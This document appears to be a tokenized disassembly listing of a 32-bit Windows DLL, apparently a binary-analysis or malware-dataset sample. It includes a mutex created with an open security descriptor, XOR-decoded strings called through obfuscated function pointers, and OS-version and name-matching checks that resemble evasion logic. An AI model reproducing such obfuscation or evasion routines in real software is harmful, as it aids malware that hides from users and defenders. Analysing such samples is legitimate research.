lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax edi
mov eax [ edi ]
jmp r-xdata
push eax
call ebx
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x2f0 ] eax
call sub_10035d10
lea ecx [ ebp - 0x26c ]
call sub_10035d10
lea ecx [ ebp - 0x2a4 ]
call sub_10035d10
xor ecx ecx
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
mov [ ebp - 0x234 ] cx
mov edi [ ebp - 0x2fc ]
push 0xffffffff
push ecx
lea edx [ edi + 0x3c ]
push edx
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x4 ] 0x5
call sub_1001c310
push 0xffffffff
push 0x0
lea eax [ edi + 0x58 ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_1000c1e0
mov eax [ ebp - 0x234 ]
cmp [ ebp - 0x220 ] esi
jae r-xdata
mov eax [ eax ]
mov ebx [ SysAllocString@IAT ]
push eax
call ebx
movzx edx [ edi + 0x38 ]
push edx
lea esi [ ebp - 0x2a4 ]
mov [ ebp - 0x300 ] eax
call sub_1003a620
add esp 0x4
mov esi eax
push r--data
add edi 0x1c
lea eax [ ebp - 0x26c ]
push edi
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10027c00
add esp 0xc
mov ecx eax
mov eax esi
lea edi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x4
call sub_10021620
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call ebx
push r--data
mov [ ebp - 0x2f4 ] eax
call ebx
movzx ecx [ edi + 0x74 ]
push ecx
lea esi [ ebp - 0x2c0 ]
mov [ ebp - 0x2f8 ] eax
call sub_1003a620
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x234 ]
push eax
call ebx
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x304 ] eax
call sub_10035d10
mov edx [ edi + 0x78 ]
push edx
lea esi [ ebp - 0x2dc ]
call sub_1003a620
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x2dc ]
mov edi eax
call sub_10035d10
mov eax [ ebp - 0x2fc ]
mov ecx [ eax + 0x7c ]
push ecx
lea esi [ ebp - 0x288 ]
call sub_1003a620
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x288 ]
mov esi eax
call sub_10035d10
mov ebx [ ebp - 0x304 ]
mov edx [ ebp - 0x2f0 ]
mov eax [ ebp - 0x300 ]
mov ecx [ ebp - 0x2f4 ]
push esi
push edi
push ebx
push edx
mov edx [ ebp - 0x2f8 ]
push eax
lea esi [ ebp - 0x328 ]
call sub_100521b0
mov ecx [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x6
mov esi [ SysFreeString@IAT ]
push ecx
call esi
mov edx [ ebp - 0x2f0 ]
push edx
call esi
mov eax [ ebp - 0x2f4 ]
push eax
call esi
mov ecx [ ebp - 0x2f8 ]
push ecx
call esi
push ebx
call esi
push edi
call esi
mov eax [ ebp - 0x2e4 ]
lea edx [ ebp - 0x328 ]
add eax 0x128
push edx
call sub_10068440
lea ecx [ ebp - 0x2e4 ]
call sub_1005fd20
test eax eax
lea eax [ ebp - 0x328 ]
je r-xdata
mov eax [ eax ]
call sub_10015ec0
lea ecx [ ebp - 0x234 ]
call sub_10035d10
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
xor eax eax
call sub_10015ec0
lea ecx [ ebp - 0x234 ]
call sub_10035d10
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x6
jmp r-xdata
sub_100024e0
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x100
cmp eax ebx
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call [ GetProcessHeap@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea ecx [ ebp - 0x10 ]
push ecx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ebx
lea ecx [ ebp - 0x48 ]
push ecx
push 0x1
mov [ ebp - 0x48 ] 0x1f0001
mov [ ebp - 0x44 ] 0x2
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] 0x5
mov [ ebp - 0x2c ] edx
call [ SetEntriesInAclW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x14 ]
push edx
call [ FreeSid@IAT ]
push 0x14
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x1
push esi
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push edi
mov edx [ ebp - 0x1c ]
push ebx
push edx
push 0x1
push esi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
jne r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
push ecx
xor eax eax
push ebx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
push edx
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
call [ CreateMutexW@IAT ]
push esi
push ebx
mov [ ebp - 0x18 ] eax
push edi
cmp eax ebx
je r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100026dd
push 0x28
mov eax sub_1007e526
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
push ecx
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10058754
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_100027c0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x1
jne r-xdata
push 0x0
push eax
call sub_10019870
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
mov eax 0x2
call sub_10050930
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_10078970
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1000b569
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_1006b860
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1000b569
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x0
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_10047ba0
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100029f0
push 0x4c
mov eax sub_1007e2ca
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x3c ] al
lea eax [ ebp - 0x58 ]
push eax
mov ecx ebx
mov [ ebp - 0x30 ] edi
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_100519c6
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
call sub_1002a730
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1002a674
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
mov edi [ ebx + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x40 ] al
push [ ebp - 0x40 ]
lea eax [ ebp - 0x4c ]
push [ ebp - 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_10004394
mov ecx [ eax ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
xor esi esi
push [ ebp - 0x38 ]
mov [ ebp + 0x14 ] eax
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_1000a47d
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x50 ]
call sub_10019c00
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
cmp edi [ ebp - 0x30 ]
jbe r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x34 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_1003fc32
mov ecx [ eax ]
add esi [ ebp - 0x34 ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
push [ eax ]
sub [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x38 ]
call sub_1000a47d
add esp 0x30
push edi
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_1000a47d
add esp 0x18
jmp r-xdata
sub edi [ ebp - 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp - 0x30 ]
sub eax edi
inc eax
push eax
lea ecx [ esi + edi ]
push ecx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
mov [ ebp - 0x40 ] ecx
call sub_1000efa2
mov eax [ ebp - 0x40 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x48 ]
add esp 0x10
inc [ ebp - 0x30 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
sub_10002bf0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ esp + 0x18 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ esp + 0x2c ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_10002ce8
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100137e1
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10002d90
cmp esi edi
je r-xdata
mov eax esi
retn
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10002dcf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1000a6a2
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1002836c
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
sub_10002e61
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_100264a3
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100096ad
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_10012991
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10002f50
push ebp
mov ebp esp
sub esp 0x1d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ rw-data ]
push 0x11c
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
mov [ ebp - 0x1d8 ] edi
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x1d0 ]
push ecx
mov [ ebp - 0x1d0 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1cc ] 0x5
push ebx
mov ebx [ StrStrIW@IAT ]
push esi
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
xor eax eax
cmp [ ebp - 0x1c8 ] 0x1
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffea
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
lea edx [ ebp - 0x54 ]
mov eax 0x21
call sub_10036cd0
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x4f
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c ] ax
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x4
call sub_10036cd0
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa7
and edx 0xff
mov [ ebp + eax * 2 - 0xb4 ] dx
inc eax
cmp eax 0x11
jb r-xdata
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x92 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffb1
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0xe ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop esi
pop ebx
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x55
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2c ] ax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x78 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffad
and edx 0xff
mov [ ebp + eax * 2 - 0x90 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x7a ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffad
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x56 ] ax
lea esp [ esp ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x74
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x3a ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
call sub_10036b00
test eax eax
jne r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
xor eax eax
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edi [ CryptAcquireContextW@IAT ]
mov ebx [ GetLastError@IAT ]
mov edi edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0xb4 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp - 0x1d8 ]
add esi 0x1c
cmp esi [ edx + 0xda4 ]
